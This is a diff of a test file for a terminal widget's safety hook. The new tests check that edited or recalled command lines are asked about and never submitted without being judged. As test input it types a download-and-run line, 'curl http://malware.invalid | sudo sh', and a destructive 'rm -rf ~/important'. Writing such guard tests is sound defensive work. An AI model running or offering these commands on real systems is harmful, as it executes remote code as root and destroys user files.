@@ -2301,8 +2301,8 @@ _hsent.clear()
 hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
 _htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
 key(hk, Qt.Key.Key_Return)
-ok(b'\r' not in _hsent and b'\x15' in _hsent,
-   'hook blocks: not submitted, typed line discarded (Ctrl+U)')
+ok(b'\r' not in _hsent and b'\x05\x15' in _hsent,
+   'hook blocks: not submitted, typed line discarded (whole-line Ctrl+E,Ctrl+U)')
 ok(_hnotes and _hnotes[-1] == 'no', 'hook advisory surfaced')
 # history recall desyncs the hook's view of the line, so it must FAIL SAFE (ask),
 # not judge a stale/empty buffer and wave a recalled command through.
@@ -2312,7 +2312,7 @@ hk._hook_ask = lambda _c, _r: (_asked.append(_r['message']) or 'discard')
 key(hk, Qt.Key.Key_Up)                 # recall from history -> buffer now stale
 ok(hk._line_dirty, 'a history/edit key marks the line unverifiable for the hook')
 key(hk, Qt.Key.Key_Return)
-ok(_asked and b'\x15' in _hsent and b'\r' not in _hsent,
+ok(_asked and b'\x05\x15' in _hsent and b'\r' not in _hsent,
    'edited line: hook asks and (on decline) discards, never submits unjudged')
 ok(not hk._line_dirty, 'dirty flag cleared after the decision')
 # defense-in-depth: the hook layer single-lines a suggestion upstream, but the
@@ -2354,6 +2354,20 @@ hk._line_buffer = 'x'
 key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U: full-line discard
 ok(not hk._line_dirty and hk._line_buffer == '',
    'Ctrl+U discards the line and stays clean (nothing stale to ask about)')
+# Ctrl+U's reach is cursor-dependent (bash unix-line-discard kills only cursor-to-
+# start), so it must NOT clear an ALREADY-dirty flag: Home (dirty) then Ctrl+U can
+# leave a survivor in the shell, but the old code reset the flag -> Enter submitted
+# it UNJUDGED. Fail-on-old canary for the command_hook bypass (reviewdrain15).
+_asked2 = []
+hk._hook_ask = lambda _c, _r: (_asked2.append(1) or 'discard')
+hk._line_buffer = 'rm -rf ~/important'
+hk._line_dirty = True                                # cursor moved (e.g. Home/Ctrl+A)
+key(hk, Qt.Key.Key_U, mods=_ctrl_mod)                # Ctrl+U at a non-end cursor
+ok(hk._line_dirty,
+   'Ctrl+U after a cursor move STAYS dirty -- a survivor must still fail safe')
+key(hk, Qt.Key.Key_Return)
+ok(_asked2, 'Enter after dirty+Ctrl+U ASKS, never submits the unjudged survivor')
+hk._line_dirty = False
 
 # --- paste + hook: a paste can NEVER auto-execute. A SINGLE-line paste (with or
 # without a trailing newline) is delivered with its trailing submit stripped, so
@@ -2414,6 +2428,17 @@ _pmt = _QMimeHook()
 _pmt.setText('ls')
 _tuihk.insertFromMimeData(_pmt)
 ok(not _tuihk._line_dirty, 'a TUI-mode paste does not set the line-dirty flag')
+# TUI handler: Ctrl+U must PRESERVE an already-dirty flag too (its reach is cursor-
+# dependent), or a bare-prompt accept-line in TUI submits an unjudged survivor -- the
+# same command_hook bypass as the CLI path. Ctrl+C (SIGINT) still settles the line.
+_tuictrl = Qt.KeyboardModifier.ControlModifier
+_tuihk.has_foreground_program = lambda: False
+_tuihk._line_dirty = True
+key(_tuihk, Qt.Key.Key_U, mods=_tuictrl)             # Ctrl+U at a non-end cursor
+ok(_tuihk._line_dirty, 'TUI Ctrl+U after a cursor move STAYS dirty (no hook bypass)')
+_tuihk._line_dirty = True
+key(_tuihk, Qt.Key.Key_C, mods=_tuictrl)             # Ctrl+C discards the whole line
+ok(not _tuihk._line_dirty, 'TUI Ctrl+C (SIGINT) settles the line -- flag cleared')
 
 # --- paste WITHOUT a hook: _line_dirty has a SECOND consumer beyond the hook --
 # _line_pending(), the guard that stops _send_reexport from typing "export
